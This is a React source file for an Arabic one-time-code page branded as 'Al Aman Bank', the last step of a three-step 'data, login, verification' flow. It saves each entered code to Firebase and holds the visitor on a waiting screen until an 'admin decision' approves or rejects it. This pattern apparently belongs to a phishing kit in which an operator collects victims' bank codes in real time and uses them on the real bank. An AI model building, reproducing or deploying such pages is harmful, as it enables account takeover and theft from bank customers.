import { useState, useEffect, useRef } from "react";
import { useNavigate } from "@/components/TransitionContext";
import { saveOtp, listenForApproval, resetSession } from "@/lib/firebase";

const BLUE = "#1a3a7a";
const BLUE2 = "#1e4db7";

function StepBar({ active }: { active: number }) {
  const labels = ["بياناتك", "تسجيل الدخول", "التحقق"];
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "20px 24px 8px", gap: 0 }}>
      {labels.map((label, i) => (
        <div key={i} style={{ display: "flex", alignItems: "center", flex: i < labels.length - 1 ? 1 : "none" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 4, flexShrink: 0 }}>
            <div style={{
              width: 34, height: 34, borderRadius: "50%",
              background: i < active ? `linear-gradient(135deg,#10b981,#059669)` : i === active ? `linear-gradient(135deg,${BLUE},${BLUE2})` : "#e2e8f0",
              color: i <= active ? "white" : "#94a3b8",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontSize: 13, fontWeight: 800,
              boxShadow: i <= active ? `0 4px 14px ${BLUE}40` : "none",
            }}>
              {i < active ? "✓" : i + 1}
            </div>
            <span style={{ fontSize: 9, fontWeight: 700, color: i <= active ? BLUE : "#94a3b8" }}>{label}</span>
          </div>
          {i < labels.length - 1 && (
            <div style={{ flex: 1, height: 2, margin: "0 6px", marginBottom: 16, background: i < active ? "#10b981" : "#e2e8f0", borderRadius: 2 }} />
          )}
        </div>
      ))}
    </div>
  );
}

type PageState = "form" | "waiting" | "approved" | "rejected";

export default function OtpPage() {
  const { navigateTo, navigateBack } = useNavigate();
  const [otp, setOtp] = useState("");
  const [timeLeft, setTimeLeft] = useState(120);
  const [pageState, setPageState] = useState<PageState>("form");
  const [error, setError] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const unsubRef = useRef<(() => void) | null>(null);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const t = setInterval(() => setTimeLeft(s => s - 1), 1000);
    return () => clearInterval(t);
  }, [timeLeft]);

  // Clean up Firestore listener on unmount
  useEffect(() => {
    return () => { unsubRef.current?.(); };
  }, []);

  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  const onChange = (v: string) => {
    if (!/^\d*$/.test(v)) return;
    const trimmed = v.slice(0, 6);
    setOtp(trimmed);
    if (submitted) setError(trimmed.length >= 4 ? "" : "أدخل رمزاً مكوناً من 4 إلى 6 أرقام");
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    if (timeLeft <= 0) { setError("انتهت مدة الرمز. اضغط على إعادة الإرسال"); return; }
    if (otp.length < 4) { setError("أدخل رمزاً مكوناً من 4 إلى 6 أرقام"); return; }

    setError("");
    await saveOtp(otp).catch(console.error);

    // Switch to waiting screen and start listening for admin decision
    setPageState("waiting");
    unsubRef.current = listenForApproval((approved) => {
      if (approved === true) {
        unsubRef.current?.();
        setPageState("approved");
        resetSession();
        setTimeout(() => navigateTo("/"), 2500);
      } else if (approved === false) {
        unsubRef.current?.();
        setPageState("rejected");
      }
    });
  };

  const handleRetry = () => {
    setPageState("form");
    setOtp("");
    setSubmitted(false);
    setError("");
    setTimeLeft(120);
  };

  const isComplete = otp.length >= 4;

  /* ── Waiting for admin ── */
  if (pageState === "waiting") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#0d2660,${BLUE},${BLUE2})`, fontFamily: "'Cairo',sans-serif", padding: "0 32px", textAlign: "center" }}>
        {/* Spinning ring loader */}
        <div style={{ position: "relative", width: 96, height: 96, marginBottom: 32 }}>
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: `3px solid rgba(255,255,255,0.1)` }} />
          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: `3px solid transparent`, borderTopColor: "#f5d06e", animation: "ab-spin 1s linear infinite" }} />
          <div style={{ position: "absolute", inset: 14, borderRadius: "50%", background: "rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 28 }}>
            🔐
          </div>
        </div>
        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 10px" }}>جارٍ التحقق من الرمز</h2>
        <p style={{ color: "rgba(200,220,255,0.75)", fontSize: 13, lineHeight: 1.8, margin: "0 0 28px" }}>
          تم إرسال الرمز، يُرجى الانتظار<br />بينما يتحقق النظام من صحة البيانات
        </p>
        {/* Bouncing dots */}
        <div style={{ display: "flex", gap: 8 }}>
          {[0, 1, 2, 3].map(i => (
            <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: "#f5d06e", animation: `ab-dot 1.2s ease-in-out infinite`, animationDelay: `${i * 0.18}s` }} />
          ))}
        </div>
      </div>
    );
  }

  /* ── Approved ── */
  if (pageState === "approved") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#064e3b,#065f46,#059669)`, fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 32px" }}>
        <div style={{ position: "relative", marginBottom: 28 }}>
          {[0, 1].map(i => (
            <div key={i} style={{ position: "absolute", inset: i * 12, borderRadius: "50%", border: `2px solid rgba(16,185,129,${0.4 - i * 0.2})`, animation: `ab-ring 2s ease-out infinite`, animationDelay: `${i * 0.5}s` }} />
          ))}
          <div className="ab-scale-in" style={{ width: 96, height: 96, borderRadius: "50%", background: "rgba(255,255,255,0.15)", border: "3px solid rgba(255,255,255,0.4)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 44, boxShadow: "0 8px 40px rgba(0,0,0,0.3)" }}>
            ✅
          </div>
        </div>
        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 24, fontWeight: 900, margin: "0 0 10px" }}>تم التحقق بنجاح!</h2>
        <p style={{ color: "rgba(220,255,240,0.8)", fontSize: 14, lineHeight: 1.8 }}>مرحباً بك في مصرف الأمان<br />جارٍ تسجيل الدخول...</p>
        <div style={{ display: "flex", gap: 8, marginTop: 20 }}>
          {[0, 1, 2, 3].map(i => <div key={i} style={{ width: 8, height: 8, borderRadius: "50%", background: "rgba(255,255,255,0.7)", animation: `ab-dot 1.2s ease-in-out infinite`, animationDelay: `${i * 0.18}s` }} />)}
        </div>
      </div>
    );
  }

  /* ── Rejected ── */
  if (pageState === "rejected") {
    return (
      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#450a0a,#7f1d1d,#991b1b)`, fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 32px" }}>
        <div className="ab-scale-in" style={{ width: 96, height: 96, borderRadius: "50%", background: "rgba(255,255,255,0.1)", border: "3px solid rgba(255,100,100,0.5)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 44, marginBottom: 24, boxShadow: "0 8px 40px rgba(0,0,0,0.4)" }}>
          ❌
        </div>
        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 22, fontWeight: 900, margin: "0 0 10px" }}>رمز التحقق غير صحيح</h2>
        <p style={{ color: "rgba(255,200,200,0.8)", fontSize: 13, lineHeight: 1.8, marginBottom: 32 }}>
          الرمز الذي أدخلته غير صحيح أو منتهي الصلاحية.<br />يرجى المحاولة مرة أخرى.
        </p>
        <button
          onClick={handleRetry}
          style={{ padding: "14px 40px", borderRadius: 14, background: "rgba(255,255,255,0.15)", border: "1.5px solid rgba(255,255,255,0.3)", color: "white", fontSize: 15, fontWeight: 800, cursor: "pointer", fontFamily: "'Cairo',sans-serif", backdropFilter: "blur(8px)" }}
        >
          إعادة المحاولة
        </button>
      </div>
    );
  }

  /* ── OTP Form ── */
  return (
    <div dir="rtl" style={{ fontFamily: "'Cairo',sans-serif", maxWidth: 480, margin: "0 auto", minHeight: "100vh", background: "#f4f7ff" }}>

      <nav style={{ background: "white", position: "sticky", top: 0, zIndex: 50, display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 16px", boxShadow: "0 2px 16px rgba(26,58,122,0.08)" }}>
        <button onClick={() => navigateBack()} style={{ background: `${BLUE}12`, border: "none", width: 36, height: 36, borderRadius: 10, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", color: BLUE }}>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ width: 18, height: 18 }}><path d="M9 18l6-6-6-6" /></svg>
        </button>
        <span style={{ fontSize: 15, fontWeight: 800, color: BLUE }}>رمز التحقق</span>
        <img src="/aman-bank-logo.png" alt="مصرف الأمان" style={{ height: 52 }} />
      </nav>

      <div style={{ position: "relative", overflow: "hidden", background: `linear-gradient(135deg,#0d2660,${BLUE},${BLUE2})`, padding: "32px 24px 52px", textAlign: "center" }}>
        <div style={{ position: "absolute", top: -40, right: -40, width: 160, height: 160, borderRadius: "50%", background: "rgba(255,255,255,0.05)", animation: "ab-orb-drift 9s ease-in-out infinite" }} />
        <div style={{ fontSize: 44, marginBottom: 12 }} className="ab-float">🔐</div>
        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 6px" }}>رمز التحقق</h2>
        <p style={{ color: "rgba(200,220,255,0.75)", fontSize: 13, margin: 0 }}>أدخل الرمز المرسل إلى هاتفك المحمول</p>
        <div style={{ position: "absolute", bottom: 0, left: 0, right: 0 }}>
          <svg viewBox="0 0 480 36" preserveAspectRatio="none" style={{ width: "100%", height: 36, display: "block" }}>
            <path d="M0,18 C120,36 240,0 360,18 C420,26 460,8 480,18 L480,36 L0,36 Z" fill="#f4f7ff" />
          </svg>
        </div>
      </div>

      <StepBar active={2} />

      <div style={{ padding: "8px 16px 32px" }}>
        <div className="ab-card" style={{ padding: 28 }}>
          <form onSubmit={submit} noValidate>
            <p style={{ textAlign: "center", color: "#475569", fontSize: 13, lineHeight: 1.7, marginTop: 0, marginBottom: 24 }}>
              أدخل رمز التأكيد المكون من <strong style={{ color: BLUE }}>4 إلى 6 أرقام</strong><br />المرسل إلى هاتفك المحمول
            </p>

            <div style={{ marginBottom: 8 }}>
              <input
                type="text" inputMode="numeric" maxLength={6} value={otp}
                onChange={e => onChange(e.target.value)}
                placeholder="• • • • • •"
                dir="ltr"
                style={{
                  width: "100%", height: 64, textAlign: "center",
                  fontSize: 28, fontWeight: 800, letterSpacing: 14,
                  borderRadius: 16, border: `2.5px solid ${otp.length >= 4 ? BLUE : submitted && error ? "#ef4444" : "#dde4f0"}`,
                  background: submitted && error && otp.length < 4 ? "#fff5f5" : "#f8faff",
                  color: BLUE, outline: "none", fontFamily: "monospace",
                  boxShadow: otp.length >= 4 ? `0 4px 18px ${BLUE}35` : "none",
                  transition: "all 0.18s", boxSizing: "border-box",
                }}
              />
            </div>

            {error && <p style={{ color: "#ef4444", fontSize: 12, textAlign: "center", fontWeight: 700, margin: "8px 0 0" }}>{error}</p>}

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", margin: "20px 0 16px" }}>
              <button type="button" disabled={timeLeft > 0}
                onClick={() => { setTimeLeft(120); setError(""); setSubmitted(false); setOtp(""); }}
                style={{ background: "none", border: "none", fontWeight: 700, fontSize: 13, cursor: timeLeft > 0 ? "not-allowed" : "pointer", color: timeLeft > 0 ? "#cbd5e1" : BLUE, fontFamily: "'Cairo',sans-serif" }}>
                إعادة الإرسال
              </button>
              <div style={{ padding: "8px 16px", borderRadius: 12, fontFamily: "monospace", fontWeight: 800, fontSize: 15, background: timeLeft > 30 ? "#f0f4ff" : timeLeft > 0 ? "#fff5f5" : "#fee2e2", color: timeLeft > 30 ? BLUE : "#ef4444", border: `1.5px solid ${timeLeft > 30 ? "#dde4f0" : "#fca5a5"}` }}>
                {timeLeft > 0 ? fmt(timeLeft) : "انتهى ⚠️"}
              </div>
            </div>

            {timeLeft <= 0 && (
              <div style={{ background: "#fff5f5", border: "1px solid #fca5a5", borderRadius: 14, padding: "12px 16px", marginBottom: 16, textAlign: "right" }}>
                <p style={{ color: "#ef4444", fontSize: 12, margin: 0, lineHeight: 1.7 }}>انتهت صلاحية الرمز. اضغط على "إعادة الإرسال" للحصول على رمز جديد.</p>
              </div>
            )}

            <button type="submit"
              style={{ width: "100%", padding: "16px 0", borderRadius: 14, fontWeight: 800, fontSize: 15, color: "white", border: "none", cursor: isComplete && timeLeft > 0 ? "pointer" : "not-allowed", background: isComplete && timeLeft > 0 ? `linear-gradient(135deg,${BLUE},${BLUE2})` : "#c0cfe8", boxShadow: isComplete && timeLeft > 0 ? `0 6px 24px ${BLUE}45` : "none", transition: "all 0.2s", fontFamily: "'Cairo',sans-serif" }}>
              تأكيد ✓
            </button>
          </form>
        </div>
      </div>

      <div style={{ padding: "0 16px 24px", textAlign: "center" }}>
        <p style={{ color: "#94a3b8", fontSize: 11 }}>© 2019 مصرف الأمان — جميع الحقوق محفوظة</p>
      </div>
    </div>
  );
}
